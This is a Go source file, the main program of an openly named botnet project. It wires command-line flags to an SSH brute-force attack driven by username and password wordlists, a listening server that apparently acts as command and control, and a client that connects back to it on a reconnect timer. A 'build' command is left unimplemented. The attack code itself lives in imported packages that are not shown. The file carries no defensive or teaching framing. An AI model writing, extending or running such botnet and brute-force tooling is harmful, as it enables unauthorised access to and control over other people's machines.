package main

import (
	"flag"
	"fmt"
	"time"

	"gitlab.com/rodzzlessa24/botnet/attacks/ssh"
	"gitlab.com/rodzzlessa24/botnet/client"
	"gitlab.com/rodzzlessa24/botnet/server"
)

func main() {
	reconPtr := flag.Int64("rt", 1, "Time to reconnect to cc")
	targetPtr := flag.String("target", "", "target to connect to")
	portPtr := flag.Int("port", 9999, "port to connect to")
	usernameFilePtr := flag.String("ufile", "", "username file to use for brute force attack")
	passFilePtr := flag.String("pfile", "", "password file to use for brute force attack")
	flag.Parse()
	args := flag.Args()

	if args[0] != "attack" && args[0] != "listen" && args[0] != "connect" && args[0] != "build" {
		fmt.Println("[ERROR] command must be either attack, listen, or connect")
		return
	}

	switch args[0] {
	case "attack":
		if len(args) < 2 {
			fmt.Println("[ERROR] you must provide an attack type")
			return
		}
		if args[1] == "ssh" {
			if *usernameFilePtr == "" || *passFilePtr == "" {
				fmt.Println("[ERROR] you must pass in a username and password file")
				return
			}

			a := ssh.Attack{
				UsernameFile: *usernameFilePtr,
				PasswordFile: *passFilePtr,
			}

			a.Run()
		}
	case "listen":
		s := &server.Server{
			Port:   *portPtr,
			Target: *targetPtr,
		}
		s.Run()
	case "connect":
		c := &client.Client{
			Port:       *portPtr,
			Target:     *targetPtr,
			ReconnTime: time.Duration(*reconPtr),
		}
		c.Run()
	case "build":
		fmt.Println("I still need to implement this functionality =]")
	}
}
